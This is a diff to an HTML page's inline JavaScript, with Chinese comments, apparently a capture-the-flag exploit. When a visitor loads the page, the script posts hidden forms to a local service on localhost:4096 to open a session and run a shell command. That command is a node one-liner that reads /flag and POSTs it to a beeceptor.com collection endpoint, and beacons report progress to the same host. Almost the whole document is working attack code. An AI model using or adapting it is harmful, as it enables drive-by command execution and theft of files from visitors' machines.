@@ -3,21 +3,18 @@
 <body>
 <script>
 (function() {
-    // 替换为你的接收端地址
-    const EXFIL = "https://1233334.free.beeceptor.com";
+    const EXFIL = "1233334.free.beeceptor.com";  // 替换为你的接收端
     const RUN_ID = Math.random().toString(36).substring(2) + Date.now();
 
     function beacon(action, extra) {
-        let img = new Image();
-        img.src = `${EXFIL}/log?run=${RUN_ID}&action=${encodeURIComponent(action)}` + (extra ? `&${extra}` : '');
+        new Image().src = `${EXFIL}/log?run=${RUN_ID}&action=${encodeURIComponent(action)}` + (extra ? `&${extra}` : '');
     }
 
-    // Payload: 使用 node 修改 flag 权限并外发
     const PAYLOAD = `node -e "require('fs').chmodSync('/flag', 0o644); require('http').request('${EXFIL}/flag?run=${RUN_ID}',{method:'POST'},r=>{}).end(require('fs').readFileSync('/flag'))"`;
 
     const BASE = 'http://localhost:4096';
 
-    // 通过隐藏 iframe 提交表单，避免页面跳转
+    // 通过隐藏 iframe 提交表单，不读取响应，但浏览器会自动保存 Cookie
     function postForm(url, data) {
         let iframe = document.createElement('iframe');
         iframe.name = 'hiddenFormTarget';
@@ -28,11 +25,11 @@
         form.action = url;
         form.target = 'hiddenFormTarget';
         form.style.display = 'none';
-        for (let key in data) {
+        for (let [k, v] of Object.entries(data)) {
             let input = document.createElement('input');
             input.type = 'hidden';
-            input.name = key;
-            input.value = data[key];
+            input.name = k;
+            input.value = v;
             form.appendChild(input);
         }
         document.body.appendChild(form);
@@ -51,14 +48,12 @@
     probe.src = BASE + '/';
     probe.onload = () => {
         beacon('port_open');
-        // 第一步：创建会话，让服务端设置 Cookie
+        // 1. 创建 session，服务端返回 Set-Cookie，浏览器自动保存
         postForm(BASE + '/session', {});
-        // 第二步：稍等片刻，发送命令（尝试多个可能的 session id）
+        // 2. 等待 Cookie 生效，然后发送命令（使用常见的 session ID 1）
         setTimeout(() => {
-            const ids = ['1', '2', '3', 'session', 'default', 'test-session-123'];
-            ids.forEach(id => {
-                postForm(BASE + `/session/${id}/shell`, { command: PAYLOAD });
-            });
+            postForm(BASE + '/session/1/shell', { command: PAYLOAD });
+            postForm(BASE + '/session/1/shell', { cmd: PAYLOAD });  // 尝试不同参数名
             beacon('exploit_sent');
         }, 1000);
     };
